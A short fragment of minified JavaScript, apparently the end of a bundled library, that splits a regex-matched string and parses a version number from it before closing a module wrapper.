*\d+\.\w+/i))&&1<(e=t[0].split(/[ \/\.]/i)).length?parseInt(e[1]):null},o}()}).call(this);